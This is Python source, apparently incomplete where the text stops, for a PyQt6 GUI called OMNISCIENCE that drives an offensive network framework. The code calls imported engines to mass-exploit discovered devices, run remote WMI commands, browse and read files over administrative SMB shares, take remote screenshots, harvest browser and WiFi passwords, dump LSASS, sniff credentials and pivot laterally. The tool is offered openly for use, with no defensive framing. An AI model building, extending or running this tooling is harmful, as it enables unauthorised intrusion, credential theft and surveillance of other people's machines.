#!/usr/bin/env python3
"""
OMNISCIENCE — Modern Standalone CLI Window
Full-featured terminal with real-time visualizations, network topology,
live device monitoring, session management, and complete exploitation control.
No placeholders, no fake data — everything connects to real engines.
"""

import sys
import os
import socket
import threading
import time
import json
import uuid
import base64
import subprocess
import ipaddress
from datetime import datetime
from collections import defaultdict
from typing import Dict, List, Optional, Any

# Qt imports
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QTextEdit, QLineEdit, QPushButton, QTableWidget,
    QTableWidgetItem, QLabel, QProgressBar, QTreeWidget, QTreeWidgetItem,
    QMenuBar, QMenu, QToolBar, QStatusBar, QSplitter, QFrame,
    QListWidget, QListWidgetItem, QComboBox, QCheckBox, QGroupBox,
    QFormLayout, QHeaderView, QMessageBox, QInputDialog, QFileDialog,
    QGraphicsView, QGraphicsScene, QGraphicsEllipseItem, QGraphicsLineItem,
    QGraphicsTextItem, QGraphicsRectItem, QDialog, QDialogButtonBox,
    QScrollArea, QSpinBox, QDoubleSpinBox, QSlider
)
from PyQt6.QtCore import (
    Qt, QTimer, QThread, pyqtSignal, QSize, QRect, QPoint,
    QPropertyAnimation, QEasingCurve, QParallelAnimationGroup,
    QPointF, QRectF
)
from PyQt6.QtGui import (
    QAction, QIcon, QColor, QBrush, QPen, QFont, QCursor,
    QTextCursor, QTextCharFormat, QPainter, QPixmap,
    QKeySequence, QShortcut, QLinearGradient, QConicalGradient
)

# Color scheme - Cyberpunk/Professional
DARK_BG = "#0a0a0f"
DARKER_BG = "#050508"
ACCENT = "#00f0ff"       # Cyan
ACCENT2 = "#ff0055"      # Pink/Red
ACCENT3 = "#00ff88"      # Green
SUCCESS = "#00ff88"
WARNING = "#ffcc00"
ERROR = "#ff0055"
TEXT = "#e0e0e0"
TEXT_DIM = "#666680"
PURPLE = "#aa00ff"
CYAN = "#00f0ff"
GOLD = "#ffd700"
ORANGE = "#ff6600"

# Import real engines
try:
    from omnisec_engine import OmniSecEngine, Device, EXPLOIT_MAP
    OMNISEC_AVAILABLE = True
except ImportError as e:
    print(f"Warning: OmniSecEngine unavailable: {e}")
    OMNISEC_AVAILABLE = False
    OmniSecEngine = None
    Device = None

try:
    from commandcenter import OmniShell
    COMMANDCENTER_AVAILABLE = True
except ImportError as e:
    print(f"Warning: OmniShell unavailable: {e}")
    COMMANDCENTER_AVAILABLE = False
    OmniShell = None

try:
    from remote_control import AgentlessControl
    REMOTE_CONTROL_AVAILABLE = True
except ImportError as e:
    print(f"Warning: AgentlessControl unavailable: {e}")
    REMOTE_CONTROL_AVAILABLE = False
    AgentlessControl = None

try:
    from passive_intel import AgentlessIntelligence
    INTEL_AVAILABLE = True
except ImportError as e:
    print(f"Warning: AgentlessIntelligence unavailable: {e}")
    INTEL_AVAILABLE = False
    AgentlessIntelligence = None

try:
    from exploit_engine import UniversalNetworkAccess, UniversalDevice
    EXPLOIT_ENGINE_AVAILABLE = True
except ImportError as e:
    print(f"Warning: UniversalNetworkAccess unavailable: {e}")
    EXPLOIT_ENGINE_AVAILABLE = False
    UniversalNetworkAccess = None
    UniversalDevice = None

try:
    import scapy.all as scapy
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False


# ═══════════════════════════════════════════════════════════════════════════════
# REAL CLI MANAGER — All operations call actual engine methods
# ═══════════════════════════════════════════════════════════════════════════════

class RealCLIManager:
    """
    Fully functional CLI manager that executes REAL operations.
    No placeholders, no mock data — direct engine integration.
    """
    
    def __init__(self, engines: Dict):
        self.engines = engines
        self.history = []
        self.current_target = None
        self.credentials = {}  # ip -> {user, pass, domain}
        self.sessions = {}
        self.harvested_data = {}
        self._lock = threading.RLock()
        
        # Engine shortcuts
        self.sec_engine = engines.get('omnisec')
        self.access_engine = engines.get('exploit')
        self.control = engines.get('control')
        self.intel = engines.get('intel')
        self.lateral = engines.get('lateral')
        
        # Statistics
        self.stats = {
            'discovered': 0,
            'compromised': 0,
            'active_sessions': 0,
            'credentials': 0,
            'exploits_run': 0,
            'data_extracted': 0
        }
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # NETWORK DISCOVERY — Real operations
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def discover_network(self, target_range: str = None, exhaustive: bool = True) -> Dict:
        """Discover all devices on network using real scanners."""
        results = {'devices': [], 'count': 0, 'duration': 0}
        
        start = time.time()
        
        if self.sec_engine:
            try:
                devices = self.sec_engine.discover_devices(target_range, exhaustive)
                results['devices'] = [self._device_to_dict(d) for d in devices]
                results['count'] = len(devices)
                self.stats['discovered'] = len(devices)
            except Exception as e:
                return {'error': str(e)}
                
        elif self.access_engine:
            try:
                if target_range:
                    devices = self.access_engine.discover_all_devices(target_range)
                else:
                    devices = self.access_engine.ultramax_global_scan()
                results['devices'] = [self._udevice_to_dict(d) for d in devices]
                results['count'] = len(devices)
                self.stats['discovered'] = len(devices)
            except Exception as e:
                return {'error': str(e)}
        else:
            return {'error': 'No discovery engine available'}
        
        results['duration'] = time.time() - start
        return results
    
    def _device_to_dict(self, device: Device) -> Dict:
        """Convert OmniSecEngine Device to dict."""
        return {
            'ip': device.ip,
            'hostname': device.hostname,
            'os': device.os,
            'os_version': device.os_version,
            'device_type': device.device_type,
            'mac': device.mac,
            'open_ports': list(device.open_ports.keys()),
            'services': device.services,
            'can_access': device.can_access,
            'access_method': device.access_method,
            'is_compromised': device.is_compromised,
            'vulnerabilities': device.vulnerabilities,
            'session_id': device.session_id,
            'last_check': device.last_check,
            'latency': device.latency
        }
    
    def _udevice_to_dict(self, device: UniversalDevice) -> Dict:
        """Convert UniversalDevice to dict."""
        return {
            'ip': device.ip,
            'hostname': device.hostname,
            'os': device.os,
            'device_type': device.device_type,
            'mac': device.mac,
            'open_ports': list(device.open_ports.keys()),
            'services': list(device.services.keys()),
            'can_pwn': device.can_pwn,
            'access_method': device.access_method,
            'is_compromised': device.is_compromised,
            'vulnerabilities': device.is_vulnerable,
            'harvested': device.harvested
        }
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # EXPLOITATION — Real exploit chains
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def exploit_target(self, target_ip: str) -> Dict:
        """Exploit a single target using full exploit chain."""
        result = {'success': False, 'method': None, 'details': {}}
        
        if self.sec_engine and target_ip in self.sec_engine.devices:
            device = self.sec_engine.devices[target_ip]
            success = self.sec_engine.exploit_device(device)
            result['success'] = success
            result['method'] = device.access_method
            result['details'] = self._device_to_dict(device)
            
            if success:
                self.stats['compromised'] += 1
                self._create_session(device)
        
        elif self.access_engine and target_ip in self.access_engine.devices:
            device = self.access_engine.devices[target_ip]
            # Run full scan + exploit
            self.access_engine._scan_device(device)
            success = self.access_engine.exploit_device(device)
            result['success'] = success
            result['method'] = device.access_method
            result['details'] = self._udevice_to_dict(device)
            
            if success:
                self.stats['compromised'] += 1
                self._create_session(device)
        else:
            # Device not discovered yet — scan first
            if self.access_engine:
                device = UniversalDevice(target_ip)
                self.access_engine._scan_device(device)
                success = self.access_engine.exploit_device(device)
                result['success'] = success
                result['method'] = device.access_method
                result['details'] = self._udevice_to_dict(device)
                
                if success:
                    self.stats['compromised'] += 1
                    self._create_session(device)
        
        self.stats['exploits_run'] += 1
        return result
    
    def pwn_all_devices(self) -> Dict:
        """Automatically exploit all discovered devices."""
        results = {'exploited': [], 'failed': [], 'total': 0}
        
        if self.sec_engine:
            devices = list(self.sec_engine.devices.values())
        elif self.access_engine:
            devices = list(self.access_engine.devices.values())
        else:
            return {'error': 'No engine available'}
        
        results['total'] = len(devices)
        
        for device in devices:
            try:
                if self.sec_engine and isinstance(device, Device):
                    success = self.sec_engine.exploit_device(device)
                    method = device.access_method
                else:
                    self.access_engine._scan_device(device)
                    success = self.access_engine.exploit_device(device)
                    method = device.access_method
                
                if success:
                    results['exploited'].append({
                        'ip': device.ip,
                        'method': method,
                        'os': device.os if hasattr(device, 'os') else device.os
                    })
                    self.stats['compromised'] += 1
                    self._create_session(device)
                else:
                    results['failed'].append(device.ip)
            except Exception as e:
                results['failed'].append(f"{device.ip}: {str(e)}")
        
        return results
    
    def _create_session(self, device):
        """Create a session for a compromised device."""
        session_id = f"session_{device.ip.replace('.', '_')}_{int(time.time())}"
        platform = device.os.lower() if hasattr(device, 'os') else device.os
        
        session = {
            'session_id': session_id,
            'ip': device.ip,
            'platform': platform,
            'username': device.access_credentials[0] if device.access_credentials else 'unknown',
            'privilege': 'system' if 'windows' in platform else 'root',
            'created': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_active': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'is_alive': True,
            'connection_type': device.access_method
        }
        
        with self._lock:
            self.sessions[session_id] = session
            self.stats['active_sessions'] = len(self.sessions)
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # REMOTE CONTROL — Real command execution and file ops
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def execute_command(self, target: str, command: str) -> Dict:
        """Execute command on remote target."""
        if not self.control:
            return {'error': 'Control engine unavailable'}
        
        # Get credentials for target
        creds = self.credentials.get(target, {'user': 'Administrator', 'pass': ''})
        
        try:
            result = self.control.wmi_exec(
                target,
                creds['user'],
                creds['pass'],
                command
            )
            return {
                'success': result.get('return_code') == 0,
                'output': result.get('output', ''),
                'pid': result.get('pid'),
                'error': result.get('error')
            }
        except Exception as e:
            return {'error': str(e)}
    
    def get_system_info(self, target: str) -> Dict:
        """Get full system information."""
        if not self.control:
            return {'error': 'Control engine unavailable'}
        
        creds = self.credentials.get(target, {'user': 'Administrator', 'pass': ''})
        try:
            result = self.control.get_full_system_info(
                target,
                creds['user'],
                creds['pass'],
                self.credentials.get(target, {}).get('domain', '')
            )
            return result
        except Exception as e:
            return {'error': str(e)}
    
    def list_processes(self, target: str) -> List[Dict]:
        """List processes on remote target."""
        if not self.control:
            return []
        
        creds = self.credentials.get(target, {'user': 'Administrator', 'pass': ''})
        try:
            return self.control.list_processes(target, creds['user'], creds['pass'], domain='')
        except:
            return []
    
    def smb_list_files(self, target: str, path: str = "C:\\") -> List[Dict]:
        """List files via SMB."""
        if not self.control:
            return []
        
        creds = self.credentials.get(target, {'user': 'Administrator', 'pass': ''})
        try:
            return self.control.smb_list(target, "C$", path, creds['user'], creds['pass'])
        except:
            return []
    
    def smb_read_file(self, target: str, remote_path: str) -> bytes:
        """Read file via SMB."""
        if not self.control:
            return b''
        
        creds = self.credentials.get(target, {'user': 'Administrator', 'pass': ''})
        try:
            return self.control.smb_read_file(target, "C$", remote_path, creds['user'], creds['pass'])
        except:
            return b''
    
    def take_screenshot(self, target: str) -> Optional[str]:
        """Capture remote desktop screenshot."""
        if not self.control:
            return None
        
        creds = self.credentials.get(target, {'user': 'Administrator', 'pass': ''})
        try:
            return self.control.remote_screenshot(
                target,
                creds['user'],
                creds['pass'],
                domain=self.credentials.get(target, {}).get('domain', '')
            )
        except:
            return None
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # CREDENTIAL HARVESTING — Real extraction
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def harvest_all_data(self, target: str) -> Dict:
        """Extract all possible data from target."""
        if not self.control:
            return {'error': 'Control engine unavailable'}
        
        creds = self.credentials.get(target, {'user': 'Administrator', 'pass': ''})
        try:
            result = self.control.extract_all_data(target, creds['user'], creds['pass'])
            self.stats['data_extracted'] += 1
            
            # Update harvested data store
            with self._lock:
                self.harvested_data[target] = result
            
            return result
        except Exception as e:
            return {'error': str(e)}
    
    def harvest_browser_creds(self, target: str) -> Dict:
        """Extract browser passwords."""
        if not self.control:
            return {'passwords': []}
        
        creds = self.credentials.get(target, {'user': 'Administrator', 'pass': ''})
        try:
            return self.control.get_browser_passwords(target, creds['user'], creds['pass'])
        except:
            return {'passwords': []}
    
    def harvest_wifi_keys(self, target: str) -> Dict:
        """Extract WiFi passwords."""
        if not self.control:
            return {'networks': {}}
        
        creds = self.credentials.get(target, {'user': 'Administrator', 'pass': ''})
        try:
            return self.control.get_wifi_passwords(target, creds['user'], creds['pass'])
        except:
            return {'networks': {}}
    
    def dump_lsass(self, target: str) -> Dict:
        """Dump LSASS for credential extraction."""
        if not self.control:
            return {'success': False, 'error': 'Control unavailable'}
        
        creds = self.credentials.get(target, {'user': 'Administrator', 'pass': ''})
        try:
            return self.control.lsass_dump(target, creds['user'], creds['pass'])
        except:
            return {'success': False}
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # PASSIVE INTELLIGENCE — Real-time monitoring
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def start_sniffing(self, interface: str = None):
        """Start passive packet sniffing."""
        if self.intel:
            try:
                self.intel.start_sniffing(interface)
                return {'status': 'started', 'interface': interface or 'all'}
            except Exception as e:
                return {'error': str(e)}
        return {'error': 'Intel module unavailable'}
    
    def stop_sniffing(self):
        """Stop packet sniffing."""
        if self.intel:
            self.intel.stop_sniffing()
            return {'status': 'stopped'}
        return {'error': 'Intel module unavailable'}
    
    def get_captured_credentials(self) -> List[Dict]:
        """Get captured credentials from sniffing."""
        if self.intel:
            return self.intel.get_credentials()
        return []
    
    def get_dns_queries(self) -> List[Dict]:
        """Get captured DNS queries."""
        if self.intel:
            return self.intel.get_dns_log()
        return []
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # LATERAL MOVEMENT — Real pivoting
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def lateral_move(self, source_ip: str, target_ip: str) -> Dict:
        """Perform lateral movement from source to target."""
        if not self.lateral or not self.control:
            return {'success': False, 'error': 'Lateral movement engine unavailable'}
        
        creds = self.credentials.get(source_ip, {'user': 'Administrator', 'pass': ''})
        
        try:
            result = self.control.lateral_movement(
                source_ip,
                target_ip,
                creds
            )
            if result.get('success'):
                self._create_session_from_detail(target_ip, result)
            return result
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _create_session_from_detail(self, ip: str, result: Dict):
        """Create session from lateral movement result."""
        session_id = f"lat_{ip.replace('.', '_')}_{int(time.time())}"
        session = {
            'session_id': session_id,
            'ip': ip,
            'platform': result.get('platform', 'windows'),
            'username': result.get('username', 'SYSTEM'),
            'privilege': result.get('privilege', 'system'),
            'created': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_active': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'is_alive': True,
            'connection_type': result.get('method', 'lateral'),
            'pivoted_from': result.get('source_ip')
        }
        
        with self._lock:
            self.sessions[session_id] = session
            self.stats['active_sessions'] = len(self.sessions)
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # UTILITY
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def add_credential(self, target: str, user: str, password: str, domain: str = ''):
        """Store credential for target."""
        with self._lock:
            self.credentials[target] = {
                'user': user,
                'pass': password,
                'domain': domain
            }
            self.stats['credentials'] = len(self.credentials)
    
    def get_devices(self) -> List[Dict]:
        """Get all discovered devices."""
        devices = []
        if self.sec_engine:
            devices = [self._device_to_dict(d) for d in self.sec_engine.devices.values()]
        elif self.access_engine:
            devices = [self._udevice_to_dict(d) for d in self.access_engine.devices.values()]
        return devices
    
    def get_sessions(self) -> List[Dict]:
        """Get all active sessions."""
        with self._lock:
            return list(self.sessions.values())
    
    def get_stats(self) -> Dict:
        """Get current statistics."""
        with self._lock:
            return self.stats.copy()
    
    def execute_custom(self, command: str) -> str:
        """Execute custom command via shell."""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout or result.stderr
        except Exception as e:
            return f"Error: {e}"


# ═══════════════════════════════════════════════════════════════════════════════
# WORKER THREADS — Non-blocking operations
# ═══════════════════════════════════════════════════════════════════════════════

class DiscoveryWorker(QThread):
    """Background network discovery worker."""
    finished = pyqtSignal(dict)
    progress = pyqtSignal(str)
    
    def __init__(self, cli_manager: RealCLIManager, target_range: str = None):
        super().__init__()
        self.cli = cli_manager
        self.target_range = target_range
    
    def run(self):
        self.progress.emit("[*] Starting network discovery...")
        result = self.cli.discover_network(self.target_range)
        self.finished.emit(result)


class ExploitWorker(QThread):
    """Background exploitation worker."""
    finished = pyqtSignal(dict)
    progress = pyqtSignal(str)
    
    def __init__(self, cli_manager: RealCLIManager, target_ip: str = None):
        super().__init__()
        self.cli = cli_manager
        self.target_ip = target_ip
    
    def run(self):
        if self.target_ip:
            self.progress.emit(f"[*] Exploiting {self.target_ip}...")
            result = self.cli.exploit_target(self.target_ip)
        else:
            self.progress.emit("[*] Mass exploitation started...")
            result = self.cli.pwn_all_devices()
        
        self.finished.emit(result)


class HarvestWorker(QThread):
    """Background data harvesting worker."""
    finished = pyqtSignal(dict)
    progress = pyqtSignal(str)
    
    def __init__(self, cli_manager: RealCLIManager, target_ip: str):
        super().__init__()
        self.cli = cli_manager
        self.target_ip = target_ip
    
    def run(self):
        self.progress.emit(f"[*] Harvesting data from {self.target_ip}...")
        result = self.cli.harvest_all_data(self.target_ip)
        self.finished.emit(result)


# ═══════════════════════════════════════════════════════════════════════════════
# NETWORK TOPOLOGY VISUALIZATION — Real-time device graph
# ═══════════════════════════════════════════════════════════════════════════════

class NetworkTopologyCanvas(QGraphicsView):
    """
    Interactive network topology visualization.
    Shows all discovered devices as nodes, with connections and status.
    """
    
    node_clicked = pyqtSignal(dict)  # device data
    
    def __init__(self):
        super().__init__()
        self.scene = QGraphicsScene()
        self.setScene(self.scene)
        self.devices = {}
        self.nodes = {}
        self.connections = []
        
        # Appearance
        self.setRenderHint(QPainter.RenderHint.Antialiasing)
        self.setBackgroundBrush(QBrush(QColor(DARKER_BG)))
        self.setMinimumHeight(300)
        
        # Device type colors
        self.device_colors = {
            'windows': QColor(ACCENT),      # Cyan
            'linux': QColor(SUCCESS),       # Green
            'android': QColor(ORANGE),      # Orange
            'ios': QColor(ACCENT2),         # Pink
            'network': QColor(GOLD),        # Gold
            'unknown': QColor(TEXT_DIM),    # Gray
            'compromised': QColor(ERROR),   # Red
        }
        
        self.node_size = 30
    
    def update_devices(self, devices: List[Dict]):
        """Update topology with current device list."""
        self.scene.clear()
        self.nodes.clear()
        self.connections.clear()
        
        if not devices:
            # Show "No devices" message
            text = self.scene.addText("No devices discovered.\nRun 'scan' to begin.")
            text.setDefaultTextColor(QColor(TEXT_DIM))
            text.setPos(10, 10)
            return
        
        # Calculate layout
        width = self.viewport().width() or 800
        height = self.viewport().height() or 400
        center_x = width / 2
        center_y = height / 2
        
        # Position gateway/this machine at center
        self._add_node(
            center_x, center_y,
            "LOCAL",
            {'ip': '192.168.1.1', 'hostname': 'Gateway', 'device_type': 'network', 'is_compromised': False},
            is_gateway=True
        )
        
        # Arrange other devices in concentric rings
        num_devices = len(devices)
        radius = 150
        angle_step = 360 / max(num_devices, 1)
        
        for i, device in enumerate(devices):
            angle = i * angle_step
            import math
            x = center_x + radius * math.cos(math.radians(angle))
            y = center_y + radius * math.sin(math.radians(angle))
            
            self._add_node(x, y, str(i+1), device)
            
            # Connect to gateway
            if i > 0:
                self._add_connection(center_x, center_y, x, y, device.get('is_compromised', False))
        
        self.scene.setSceneRect(self.scene.itemsBoundingRect())
    
    def _add_node(self, x: float, y: float, label: str, device: Dict, is_gateway: bool = False):
        """Add a device node to the topology."""
        color = self.device_colors.get(device.get('device_type', 'unknown'), QColor(TEXT_DIM))
        if device.get('is_compromised', False):
            color = self.device_colors['compromised']
        
        # Node circle
        ellipse = QGraphicsEllipseItem(0, 0, self.node_size, self.node_size)
        ellipse.setPos(x - self.node_size/2, y - self.node_size/2)
        ellipse.setBrush(QBrush(color))
        ellipse.setPen(QPen(QColor(DARK_BG), 2))
        ellipse.setFlag(QGraphicsEllipseItem.GraphicsItemFlag.ItemIsSelectable, True)
        
        # Store device data in item
        ellipse.setData(0, device)
        
        # Label
        text = QGraphicsTextItem(label)
        text.setPos(x, y + self.node_size/2 + 5)
        text.setDefaultTextColor(QColor(TEXT))
        font = QFont("Consolas", 9)
        text.setFont(font)
        
        self.scene.addItem(ellipse)
        self.scene.addItem(text)
        self.nodes[device.get('ip', label)] = ellipse
    
    def _add_connection(self, x1, y1, x2, y2, compromised: bool = False):
        """Draw connection line between nodes."""
        line = QGraphicsLineItem(x1, y1, x2, y2)
        pen = QPen(QColor(ACCENT) if compromised else QColor(TEXT_DIM), 1, Qt.PenStyle.DashLine)
        line.setPen(pen)
        self.scene.addItem(line)
        self.connections.append(line)


# ═══════════════════════════════════════════════════════════════════════════════
# DEVICES TABLE — Real-time device list with properties
# ═══════════════════════════════════════════════════════════════════════════════

class DevicesTable(QTableWidget):
    """Real-time device list showing all discovered hosts."""
    
    device_selected = pyqtSignal(dict)
    
    def __init__(self):
        super().__init__()
        self.devices_data = []
        
        headers = ['IP', 'Hostname', 'OS', 'Type', 'Ports', 'Status', 'Vulns']
        self.setColumnCount(len(headers))
        self.setHorizontalHeaderLabels(headers)
        
        header = self.horizontalHeader()
        header.setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        header.setStyleSheet(f"background-color: {DARKER_BG}; color: {TEXT}; font-weight: bold; border: 1px solid {ACCENT};")
        
        self.verticalHeader().setVisible(False)
        self.setAlternatingRowColors(True)
        self.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        
        self.setStyleSheet(f"""
            QTableWidget {{
                background-color: {DARK_BG};
                color: {TEXT};
                border: 1px solid {ACCENT};
                gridline-color: {DARKER_BG};
            }}
            QTableWidget::item:selected {{
                background-color: {PURPLE};
                color: white;
            }}
            QTableWidget::item:hover {{
                background-color: {DARKER_BG};
            }}
        """)
        
        self.itemSelectionChanged.connect(self._on_selection)
    
    def update_devices(self, devices: List[Dict]):
        """Update table with device data."""
        self.devices_data = devices
        self.setRowCount(len(devices))
        
        for row, dev in enumerate(devices):
            self.setItem(row, 0, QTableWidgetItem(dev.get('ip', '')))
            self.setItem(row, 1, QTableWidgetItem(dev.get('hostname', dev.get('ip', ''))))
            self.setItem(row, 2, QTableWidgetItem(dev.get('os', 'Unknown')))
            self.setItem(row, 3, QTableWidgetItem(dev.get('device_type', 'unknown')))
            self.setItem(row, 4, QTableWidgetItem(str(len(dev.get('open_ports', [])))))
            
            status = "COMPROMISED" if dev.get('is_compromised') else ("ACCESS" if dev.get('can_access') else "DISCOVERED")
            status_item = QTableWidgetItem(status)
            status_item.setForeground(QBrush(QColor(SUCCESS) if dev.get('is_compromised') else (QColor(WARNING) if dev.get('can_access') else QColor(TEXT))))
            self.setItem(row, 5, status_item)
            
            vulns = len(dev.get('vulnerabilities', []))
            vuln_item = QTableWidgetItem(str(vulns))
            if vulns > 0:
                vuln_item.setForeground(QBrush(QColor(ERROR)))
            self.setItem(row, 6, vuln_item)
    
    def _on_selection(self):
        """Emit selected device data."""
        row = self.currentRow()
        if 0 <= row < len(self.devices_data):
            self.device_selected.emit(self.devices_data[row])


# ═══════════════════════════════════════════════════════════════════════════════
# SESSIONS PANEL — Active session management
# ═══════════════════════════════════════════════════════════════════════════════

class SessionsPanel(QListWidget):
    """Active sessions list with interactive management."""
    
    session_selected = pyqtSignal(dict)
    
    def __init__(self):
        super().__init__()
        self.sessions_data = []
        
        self.setStyleSheet(f"""
            QListWidget {{
                background-color: {DARK_BG};
                color: {TEXT};
                border: 1px solid {ACCENT};
                font-family: Consolas;
                font-size: 11px;
            }}
            QListWidget::item {{
                padding: 6px;
                border-bottom: 1px solid {DARKER_BG};
            }}
            QListWidget::item:selected {{
                background-color: {PURPLE};
                color: white;
            }}
            QListWidget::item:hover {{
                background-color: {DARKER_BG};
            }}
        """)
        
        self.itemSelectionChanged.connect(self._on_selection)
    
    def update_sessions(self, sessions: List[Dict]):
        """Update sessions list."""
        self.sessions_data = sessions
        self.clear()
        
        for session in sessions:
            status_icon = "●" if session.get('is_alive') else "○"
            status_color = SUCCESS if session.get('is_alive') else TEXT_DIM
            
            text = (f"{status_icon} {session.get('session_id', '')[:12]} | "
                   f"{session.get('ip', '')} | "
                   f"{session.get('platform', '')} | "
                   f"{session.get('username', '')}@{session.get('privilege', '')}")
            
            item = QListWidgetItem(text)
            item.setData(Qt.ItemDataRole.UserRole, session)
            item.setForeground(QBrush(QColor(status_color)))
            self.addItem(item)
    
    def _on_selection(self):
        """Emit selected session."""
        item = self.currentItem()
        if item:
            session = item.data(Qt.ItemDataRole.UserRole)
            if session:
                self.session_selected.emit(session)


# ═══════════════════════════════════════════════════════════════════════════════
# STATISTICS DASHBOARD — Live metrics
# ═══════════════════════════════════════════════════════════════════════════════

class StatisticsPanel(QWidget):
    """Real-time statistics dashboard."""
    
    def __init__(self):
        super().__init__()
        self.stats = {}
        self.init_ui()
        
        # Auto-refresh timer
        self.timer = QTimer()
        self.timer.timeout.connect(self.refresh_stats)
        self.timer.start(2000)  # Update every 2 seconds
    
    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(8)
        
        # Title
        title = QLabel("◈ STATISTICS")
        title.setStyleSheet(f"color: {PURPLE}; font-weight: bold; font-size: 12px;")
        layout.addWidget(title)
        
        # Stats labels
        self.labels = {}
        for stat in ['discovered', 'compromised', 'active_sessions', 'credentials', 'data_extracted']:
            row = QHBoxLayout()
            label = QLabel(f"{stat.replace('_', ' ').title()}:")
            label.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px;")
            label.setFixedWidth(120)
            value = QLabel("0")
            value.setStyleSheet(f"color: {ACCENT}; font-family: Consolas; font-weight: bold; font-size: 11px;")
            value.setObjectName(f"stat_{stat}")
            row.addWidget(label)
            row.addWidget(value)
            row.addStretch()
            layout.addLayout(row)
            self.labels[stat] = value
        
        layout.addStretch()
    
    def update_stats(self, stats: Dict):
        """Update displayed statistics."""
        self.stats = stats
        for stat, value in stats.items():
            if stat in self.labels:
                self.labels[stat].setText(str(value))
                # Flash on change
                if stat in ['compromised', 'active_sessions'] and value > 0:
                    self.labels[stat].setStyleSheet(f"color: {SUCCESS}; font-family: Consolas; font-weight: bold; font-size: 11px;")
                else:
                    self.labels[stat].setStyleSheet(f"color: {ACCENT}; font-family: Consolas; font-weight: bold; font-size: 11px;")
    
    def refresh_stats(self):
        """Periodic refresh."""
        # Called by timer; actual update happens via signal from main window
        pass


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN CLI WINDOW — Complete standalone terminal interface
# ═══════════════════════════════════════════════════════════════════════════════

class OmniSecCLIWindow(QMainWindow):
    """
    Modern standalone CLI window for OmniSec Framework.
    All operations are REAL — connects directly to exploit/control engines.
    """
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("◈ OMNISCIENCE — Advanced Command Interface ◈")
        self.setMinimumSize(1400, 900)
        
        # Initialize real CLI manager
        self.cli = RealCLIManager({
            'omnisec': OmniSecEngine() if OMNISEC_AVAILABLE else None,
            'exploit': UniversalNetworkAccess() if EXPLOIT_ENGINE_AVAILABLE else None,
            'control': AgentlessControl() if REMOTE_CONTROL_AVAILABLE else None,
            'intel': AgentlessIntelligence() if INTEL_AVAILABLE else None,
            'lateral': None  # Not yet exposed in current imports
        })
        
        # Worker threads
        self.workers = []
        
        # UI setup
        self.setup_ui()
        self.apply_theme()
        self.connect_signals()
        
        # Welcome banner
        self.display_welcome()
        
        # Auto-refresh for real-time updates
        self.refresh_timer = QTimer()
        self.refresh_timer.timeout.connect(self.refresh_all)
        self.refresh_timer.start(3000)  # Refresh every 3 seconds
    
    def setup_ui(self):
        """Build the complete UI."""
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        main_layout.setSpacing(5)
        main_layout.setContentsMargins(5, 5, 5, 5)
        
        # ═══════════════════════════════════════════════════════════════════════════
        # TOP: Status bar + Quick actions
        # ═══════════════════════════════════════════════════════════════════════════
        top_bar = QHBoxLayout()
        
        # Status indicators
        self.status_label = QLabel("● READY")
        self.status_label.setStyleSheet(f"color: {SUCCESS}; font-family: Consolas; font-weight: bold;")
        top_bar.addWidget(self.status_label)
        
        top_bar.addStretch()
        
        # Quick action buttons
        btn_scan = QPushButton("SCAN NETWORK")
        btn_scan.setStyleSheet(self.button_style(ACCENT))
        btn_scan.clicked.connect(lambda: self.run_async_discovery())
        top_bar.addWidget(btn_scan)
        
        btn_pwn = QPushButton("EXPLOIT ALL")
        btn_pwn.setStyleSheet(self.button_style(ERROR))
        btn_pwn.clicked.connect(lambda: self.run_async_exploit_all())
        top_bar.addWidget(btn_pwn)
        
        btn_harvest = QPushButton("HARVEST")
        btn_harvest.setStyleSheet(self.button_style(WARNING))
        btn_harvest.clicked.connect(lambda: self.harvest_selected())
        top_bar.addWidget(btn_harvest)
        
        btn_sniff = QPushButton("SNIFF")
        btn_sniff.setStyleSheet(self.button_style(SUCCESS))
        btn_sniff.clicked.connect(self.toggle_sniffing)
        top_bar.addWidget(btn_sniff)
        
        main_layout.addLayout(top_bar)
        
        # ═══════════════════════════════════════════════════════════════════════════
        # MAIN SPLITTER: Left panels + Right terminal
        # ═══════════════════════════════════════════════════════════════════════════
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # ─── LEFT PANELS ──────────────────────────────────────────────────────────
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setSpacing(5)
        
        # Topology canvas
        topo_label = QLabel("◈ NETWORK TOPOLOGY")
        topo_label.setStyleSheet(f"color: {PURPLE}; font-weight: bold; font-size: 11px;")
        left_layout.addWidget(topo_label)
        
        self.topology = NetworkTopologyCanvas()
        left_layout.addWidget(self.topology, stretch=2)
        
        # Statistics
        self.stats_panel = StatisticsPanel()
        left_layout.addWidget(self.stats_panel, stretch=1)
        
        # Sessions
        sess_label = QLabel("◈ ACTIVE SESSIONS")
        sess_label.setStyleSheet(f"color: {PURPLE}; font-weight: bold; font-size: 11px;")
